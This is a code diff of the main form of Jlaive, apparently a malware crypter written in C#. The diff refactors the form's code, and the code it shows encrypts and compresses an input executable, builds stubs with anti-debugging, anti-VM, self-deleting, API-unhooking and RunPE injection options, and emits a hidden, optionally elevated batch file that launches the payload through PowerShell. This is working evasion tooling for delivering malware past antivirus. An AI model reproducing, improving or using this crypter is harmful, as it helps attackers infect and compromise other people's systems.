@@ -1,5 +1,4 @@
 ﻿using System;
-using System.CodeDom.Compiler;
 using System.Collections.Generic;
 using System.IO;
 using System.Linq;
@@ -17,7 +16,7 @@ namespace Jlaive
 
         private void Form1_Load(object sender, EventArgs e)
         {
-            SettingsObject obj = Settings.Load();
+            var obj = Settings.Load();
             if (obj != null) UnpackSettings(obj);
             UpdateKeys();
         }
@@ -30,8 +29,7 @@ namespace Jlaive
 
         private void openButton_Click(object sender, EventArgs e)
         {
-            OpenFileDialog ofd = new OpenFileDialog();
-            ofd.RestoreDirectory = true;
+            var ofd = new OpenFileDialog { RestoreDirectory = true };
             if (ofd.ShowDialog() != DialogResult.OK) return;
             input.Text = ofd.FileName;
         }
@@ -55,8 +53,7 @@ namespace Jlaive
 
         private void addFile_Click(object sender, EventArgs e)
         {
-            OpenFileDialog ofd = new OpenFileDialog();
-            ofd.RestoreDirectory = true;
+            var ofd = new OpenFileDialog { RestoreDirectory = true };
             if (ofd.ShowDialog() != DialogResult.OK) return;
             bindedFiles.Items.Add(ofd.FileName);
         }
@@ -66,15 +63,15 @@ namespace Jlaive
             bindedFiles.Items.Remove(bindedFiles.SelectedItem);
         }
 
-        private void Crypt(string _input, byte[] _key, byte[] _iv)
+        private void Crypt(string input, byte[] key, byte[] iv)
         {
             buildButton.Enabled = false;
             tabControl1.SelectedTab = tabControl1.TabPages["outputPage"];
             log.Items.Clear();
 
-            StubGen stubgen = new StubGen(_key, _iv);
-            byte[] payload = File.ReadAllBytes(_input);
-            bool isnetasm = IsAssembly(_input);
+            var stubgen = new StubGen(key, iv);
+            var payload = File.ReadAllBytes(input);
+            var isnetasm = IsAssembly(input);
 
             if (isnetasm)
             {
@@ -86,40 +83,26 @@ namespace Jlaive
             payload = Compress(payload);
 
             log.Items.Add("Creating stubs...");
-            string stub = stubgen.CreateCS(antiDebug.Checked, antiVM.Checked, meltFile.Checked, unhookAPI.Checked, !isnetasm);
-            string stub2 = stubgen.CreateBCS();
+            var stub = stubgen.CreateCS(antiDebug.Checked, antiVM.Checked, meltFile.Checked, unhookAPI.Checked, !isnetasm);
+            var stub2 = stubgen.CreateBCS();
 
             log.Items.Add("Building stubs...");
-            Compiler compiler = new Compiler
+            var compiler = new Compiler
             {
                 References = new string[] { "mscorlib.dll", "System.Core.dll", "System.dll", "System.Management.dll" },
                 Resources = bindedFiles.Items.Cast<string>().ToArray()
             };
-            JCompilerResult result = compiler.Build(stub);
-            if (result.CompilerResults.Errors.Count > 0)
-            {
-                string errors = string.Join(Environment.NewLine, result.CompilerResults.Errors.Cast<CompilerError>().Select(error => error.ErrorText));
-                MessageBox.Show($"Stub build errors:{Environment.NewLine}{errors}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
-                buildButton.Enabled = true;
-                return;
-            }
-            byte[] stubbytes = result.AssemblyBytes;
+            var result = compiler.Build(stub);
+            var stubbytes = result.AssemblyBytes;
             compiler = new Compiler
             {
                 References = new string[] { "mscorlib.dll", "System.Core.dll", "System.dll" }
             };
             result = compiler.Build(stub2);
-            if (result.CompilerResults.Errors.Count > 0)
-            {
-                string errors = string.Join(Environment.NewLine, result.CompilerResults.Errors.Cast<CompilerError>().Select(error => error.ErrorText));
-                MessageBox.Show($"Stub build errors:{Environment.NewLine}{errors}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
-                buildButton.Enabled = true;
-                return;
-            }
-            byte[] stubbytes2 = result.AssemblyBytes;
+            var stubbytes2 = result.AssemblyBytes;
 
             log.Items.Add("Embedding resources...");
-            List<PatcherResource> embeddedresources = new List<PatcherResource>() { new PatcherResource("JLAIVE_P", payload) };
+            var embeddedresources = new List<PatcherResource>() { new PatcherResource("JLAIVE_P", payload) };
             if (!isnetasm)
             {
                 embeddedresources.Add(new PatcherResource("JLAIVE_RP", Compress(GetEmbeddedResource("Jlaive.Resources.runpe.dll"))));
@@ -131,23 +114,23 @@ namespace Jlaive
             Patcher.AddResources(ref stubbytes, embeddedresources.ToArray());
 
             log.Items.Add("Encrypting stubs...");
-            byte[] stub_enc = Encrypt(Compress(stubbytes), _key, _iv);
-            byte[] stub2_enc = Encrypt(Compress(stubbytes2), _key, _iv);
+            var stub_enc = Encrypt(Compress(stubbytes), key, iv);
+            var stub2_enc = Encrypt(Compress(stubbytes2), key, iv);
 
             log.Items.Add("Creating PowerShell command...");
-            string pscommand = stubgen.CreatePS();
+            var pscommand = stubgen.CreatePS();
 
             log.Items.Add("Creating batch file...");
-            string content = stubgen.CreateBat(pscommand, stub_enc, stub2_enc, hidden.Checked, runas.Checked);
+            var content = stubgen.CreateBat(pscommand, stub_enc, stub2_enc, hidden.Checked, runas.Checked);
 
-            SaveFileDialog sfd = new SaveFileDialog()
+            var sfd = new SaveFileDialog()
             {
                 AddExtension = true,
                 DefaultExt = "bat",
                 Title = "Save File",
                 Filter = "Batch files (*.bat)|*.bat",
                 RestoreDirectory = true,
-                FileName = Path.ChangeExtension(_input, "bat")
+                FileName = Path.ChangeExtension(input, "bat")
             };
             sfd.ShowDialog();
 
@@ -161,38 +144,38 @@ namespace Jlaive
 
         private void UpdateKeys()
         {
-            AesManaged aes = new AesManaged();
-            key.Text = Convert.ToBase64String(aes.Key);
-            iv.Text = Convert.ToBase64String(aes.IV);
-            aes.Dispose();
+            using (var aes = new AesManaged())
+            {
+                key.Text = Convert.ToBase64String(aes.Key);
+                iv.Text = Convert.ToBase64String(aes.IV);
+            }
         }
 
         private SettingsObject PackSettings()
         {
-            SettingsObject obj = new SettingsObject()
+            return new SettingsObject()
             {
-                inputFile = input.Text,
-                antiDebug = antiDebug.Checked,
-                antiVM = antiVM.Checked,
-                selfDelete = meltFile.Checked,
-                hidden = hidden.Checked,
-                runas = runas.Checked,
-                apiUnhook = unhookAPI.Checked,
-                bindedFiles = bindedFiles.Items.Cast<string>().ToArray()
+                InputFile = input.Text,
+                AntiDebug = antiDebug.Checked,
+                AntiVM = antiVM.Checked,
+                SelfDelete = meltFile.Checked,
+                Hidden = hidden.Checked,
+                Runas = runas.Checked,
+                ApiUnhook = unhookAPI.Checked,
+                BindedFiles = bindedFiles.Items.Cast<string>().ToArray()
             };
-            return obj;
         }
 
         private void UnpackSettings(SettingsObject obj)
         {
-            input.Text = obj.inputFile;
-            antiDebug.Checked = obj.antiDebug;
-            antiVM.Checked = obj.antiVM;
-            meltFile.Checked = obj.selfDelete;
-            hidden.Checked = obj.hidden;
-            runas.Checked = obj.runas;
-            unhookAPI.Checked = obj.apiUnhook;
-            bindedFiles.Items.AddRange(obj.bindedFiles);
+            input.Text = obj.InputFile;
+            antiDebug.Checked = obj.AntiDebug;
+            antiVM.Checked = obj.AntiVM;
+            meltFile.Checked = obj.SelfDelete;
+            hidden.Checked = obj.Hidden;
+            runas.Checked = obj.Runas;
+            unhookAPI.Checked = obj.ApiUnhook;
+            bindedFiles.Items.AddRange(obj.BindedFiles);
         }
     }
 }
